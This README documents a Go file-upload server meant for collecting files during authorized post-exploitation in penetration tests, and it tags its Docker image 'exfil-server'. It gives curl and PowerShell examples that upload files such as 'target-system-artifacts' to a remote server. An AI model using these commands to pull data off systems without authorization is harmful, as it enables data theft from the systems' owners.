# File Upload Server

A lightweight, Go-based HTTP file collection server designed for authorized penetration testing engagements. This tool provides a web interface and REST API for collecting and archiving multiple files during post-exploitation activities, automatically organizing uploaded artifacts into ZIP archives.


## Features

- **Multi-file Upload Support**: Upload multiple files simultaneously through a simple web interface
- **Automatic ZIP Archiving**: Automatically packages uploaded files into organized ZIP archives
- **Named Collections**: Assign names to upload collections for better organization
- **Web Interface**: User-friendly HTML interface for file uploads
- **REST API**: Programmatic access via HTTP POST endpoints
- **Zip Slip Protection**: Implements path traversal protection for secure file handling
- **Lightweight & Fast**: Built with Go and Gin framework for high performance
- **Low Resource Footprint**: Efficient memory usage with configurable multipart limits

## Installation

### Prerequisites

- Go 1.23.0 or later
- Network access to deploy the server
- docker & docker compose for docker installation

### Build from Source

1. Clone the repository:
```bash
git clone https://github.com/B2hu/file-upload.git
cd file-upload
```

2. Install dependencies:
```bash
go mod download
```

3. Build the executable:
```bash
go build -o file-upload-server main.go
```
### Docker installation
1. build the image
```bash
git clone https://github.com/B2hu/file-upload.git && cd file-upload
docker build . -t exfil-server
```
2. run the container
```bash
mkdir 755 ./uploads # access zip folder for docker host
docker run -p 8080:8080 -v ./uploads:/app/uploads exfil-server

# if you want the container to start on a different port use :
export PORT=your_port_here
docker run -p 8080:$PORT -v ./uploads:/app/uploads exfil-server -port $PORT 
```


### Quick Start

Run the server directly with Go:
```bash
go run main.go
```

Or use the compiled binary:
```bash
./file-upload-server
```

The server will start on port `8080` by default. To use a different port, use the `-port` flag:
```bash
go run main.go -port 9090
# or
./file-upload-server -port 9090
```

## Usage

### Starting the Server

The server runs on `http://localhost:8080` by default. To change the port, use the `-port` command-line flag:

```bash
go run main.go -port 9090
# or
./file-upload-server -port 9090
```

View all available flags:
```bash
go run main.go -help
# or
./file-upload-server -help
```

### Web Interface

1. Navigate to `http://your-server-ip:8080` in a web browser
2. Enter a collection name in the "Name" field (used as the ZIP filename)
3. Select one or more files using the file picker (hold Ctrl/Cmd to select multiple)
4. Click "Submit" to upload and archive the files

The uploaded files will be automatically compressed into a ZIP archive named `{name}.zip` in the `uploads/` directory.

### API Usage

#### Upload Files

**Endpoint:** `POST /upload`

**Content-Type:** `multipart/form-data`

**Parameters:**
- `name` (required): String identifier for the collection (used as ZIP filename)
- `files` (required): One or more file uploads (multipart file field)

**Example using curl:**
```bash
curl -X POST http://your-server-ip:8080/upload \
  -F "name=target-system-artifacts" \
  -F "files=@/path/to/file1.txt" \
  -F "files=@/path/to/file2.log" \
  -F "files=@/path/to/file3.conf"
```

**Example using PowerShell:**
```powershell
$uri = "http://your-server-ip:8080/upload"
$formFields = @{
    name = "collection-name"
    files = Get-Item "C:\path\to\file1.txt", "C:\path\to\file2.log"
}
Invoke-RestMethod -Uri $uri -Method Post -Form $formFields
```

**Response:**
- `200 OK`: "All files zipped successfully"
- `400 Bad Request`: Error message for invalid requests
- `500 Internal Server Error`: Error message for server-side issues

### Collected Files

All uploaded files are automatically archived and stored in the `uploads/` directory:

```
uploads/
├── collection-name-1.zip
├── collection-name-2.zip
└── ...
```

Each ZIP file contains all files uploaded in that particular request, preserving original filenames.

## Configuration

### Memory Limits

The server limits multipart form memory to 8 MiB by default. Larger files are automatically streamed to disk. To modify this limit, edit the `MaxMultipartMemory` setting in `main.go`:

```go
router.MaxMultipartMemory = 8 << 20 // 8 MiB (adjust as needed)
```

### Port Configuration

Change the server port using the `-port` command-line flag:

```bash
./file-upload-server -port 9090
```

The default port is `8080` if no flag is specified.

## Security Considerations

- **Zip Slip Protection**: The server uses `filepath.Base()` to prevent path traversal attacks in ZIP filenames
- **No Authentication**: This tool does not include authentication. Deploy behind appropriate network security controls or add authentication if exposing to untrusted networks
- **File Size Limits**: Configure `MaxMultipartMemory` appropriately for your use case
- **Network Security**: Use HTTPS/TLS in production or sensitive environments (requires additional configuration)
- **Access Control**: Ensure proper firewall rules and network segmentation when deployed

## Project Structure

```
file-upload/
├── main.go              # Main server implementation
├── go.mod               # Go module dependencies
├── go.sum               # Go module checksums
├── public/
│   └── index.html       # Web upload interface
├── uploads/             # Generated directory for ZIP archives (created at runtime)
└── README.md            # This file
```

## Dependencies

- [Gin Web Framework](https://github.com/gin-gonic/gin) - HTTP web framework
- Standard Go libraries: `archive/zip`, `net/http`, `os`, `path/filepath`

## Development

### Running in Development Mode

For development, you may want to run with auto-reload. Consider using tools like:
- [Air](https://github.com/cosmtrek/air)
- [CompileDaemon](https://github.com/githubnemo/CompileDaemon)
- [Realize](https://github.com/oxequa/realize)

### Adding Features

Common enhancements you might consider:
- Authentication and authorization
- HTTPS/TLS support
- Upload progress tracking
- File type restrictions
- Logging and audit trails
- Database integration for metadata
- Download endpoint for retrieving ZIP files
- Automatic cleanup of old uploads

## Troubleshooting

### Port Already in Use

If port 8080 is already in use, specify a different port using the `-port` flag:
```bash
./file-upload-server -port 9090
```

### Permission Errors

Ensure the server has write permissions for the `uploads/` directory. The server will attempt to create it if it doesn't exist.

### Large File Uploads

For very large files, ensure sufficient disk space and consider increasing `MaxMultipartMemory` or implementing streaming directly to ZIP.

## License

[Specify your license here]

## Contributing

[Specify contribution guidelines if applicable]

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. Users must ensure they have explicit written authorization before using this tool against any system. Unauthorized access to computer systems violates laws in many jurisdictions. The developers assume no responsibility for misuse of this software.

